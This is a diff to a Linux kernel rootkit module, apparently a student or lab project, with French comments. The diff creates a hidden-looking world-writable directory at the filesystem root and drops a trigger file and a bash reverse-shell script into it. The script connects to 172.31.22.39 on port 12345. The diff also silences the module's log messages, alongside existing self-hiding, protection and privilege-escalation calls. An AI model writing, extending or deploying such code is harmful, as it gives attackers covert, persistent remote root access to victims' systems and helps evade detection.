@@ -6,6 +6,12 @@
 #include <linux/cred.h>
 #include <linux/kprobes.h>
 #include <linux/sched.h>
+#include <linux/fs.h>
+#include <linux/types.h>
+#include <linux/namei.h>
+#include <linux/mount.h>
+#include <linux/dcache.h>
+#include <linux/stat.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Victor, Marouane, Mina, Axel");
@@ -134,6 +140,41 @@ static int handler_pre_filldir64(struct kprobe *p, struct pt_regs *regs)
     return 0;
 }
 
+static int dir_init(void)
+{
+    struct path path;
+    struct dentry *dentry;
+    struct inode *dir_inode;
+    int ret;
+
+    // Trouver le chemin de la racine ("/")
+    ret = kern_path("/", 0, &path);
+    if (ret) {
+        // printk(KERN_ERR "Erreur lors de l'accès au répertoire racine.\n");
+        return ret;
+    }
+
+    // Obtenir l'inode du répertoire racine
+    dir_inode = path.dentry->d_inode;
+
+    // Créer la dentry pour "111111111111111111111111111"
+    dentry = d_alloc_name(path.dentry, "111111111111111111111111111");
+    if (!dentry) {
+        // printk(KERN_ERR "Erreur lors de la création de la dentry.\n");
+        return -ENOMEM;
+    }
+
+    // Créer le répertoire "111111111111111111111111111" dans le répertoire racine
+    ret = vfs_mkdir(NULL, dir_inode, dentry, S_IRWXU | S_IRWXG | S_IRWXO);
+    if (ret) {
+        // printk(KERN_ERR "Erreur lors de la création du répertoire 111111111111111111111111111.\n");
+        dput(dentry);  // Libération de la dentry en cas d'échec
+        return ret;
+    }
+
+    return 0;
+}
+
 static int lkm_file_create_init(void) {
     struct file *trigger_file, *revshell_file;
     loff_t pos_trigger = 0, pos_revshell = 0;
@@ -141,40 +182,38 @@ static int lkm_file_create_init(void) {
     char *revshell_content = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.31.22.39/12345 0>&1\n";
     ssize_t written;
 
-    printk(KERN_INFO "LKM: Initialisation du module.\n");
-
     // Crée et ouvre le premier fichier
-    trigger_file = filp_open("/root/trigger", O_WRONLY | O_CREAT | O_TRUNC, 0777);
+    trigger_file = filp_open("/111111111111111111111111111/trigger", O_WRONLY | O_CREAT | O_TRUNC, 0777);
     if (IS_ERR(trigger_file)) {
-        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /root/trigger.\n");
+        // printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /111111111111111111111111111/trigger.\n");
         return PTR_ERR(trigger_file);
     }
 
     // Écrit dans le premier fichier
     written = kernel_write(trigger_file, trigger_content, strlen(trigger_content), &pos_trigger);
     if (written < 0) {
-        printk(KERN_ERR "LKM: Échec de l'écriture dans /root/trigger.\n");
+        // printk(KERN_ERR "LKM: Échec de l'écriture dans /111111111111111111111111111/trigger.\n");
         filp_close(trigger_file, NULL);
         return written;
     }
-    printk(KERN_INFO "LKM: Écriture réussie dans /root/trigger.\n");
+    // printk(KERN_INFO "LKM: Écriture réussie dans /111111111111111111111111111/trigger.\n");
     filp_close(trigger_file, NULL);
 
     // Crée et ouvre le second fichier
-    revshell_file = filp_open("/root/revshell.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
+    revshell_file = filp_open("/111111111111111111111111111/revshell.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
     if (IS_ERR(revshell_file)) {
-        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /root/revshell.sh.\n");
+        // printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /111111111111111111111111111/revshell.sh.\n");
         return PTR_ERR(revshell_file);
     }
 
     // Écrit dans le second fichier
     written = kernel_write(revshell_file, revshell_content, strlen(revshell_content), &pos_revshell);
     if (written < 0) {
-        printk(KERN_ERR "LKM: Échec de l'écriture dans /root/revshell.sh.\n");
+        // printk(KERN_ERR "LKM: Échec de l'écriture dans /111111111111111111111111111/revshell.sh.\n");
         filp_close(revshell_file, NULL);
         return written;
     }
-    printk(KERN_INFO "LKM: Écriture réussie dans /root/revshell.sh.\n");
+    // printk(KERN_INFO "LKM: Écriture réussie dans /111111111111111111111111111/revshell.sh.\n");
     filp_close(revshell_file, NULL);
 
     return 0;
@@ -187,6 +226,7 @@ static int __init rootkit_init(void)
 
     hideme();
     protect();
+    dir_init();
     lkm_file_create_init();
 
     // Privilege escalation
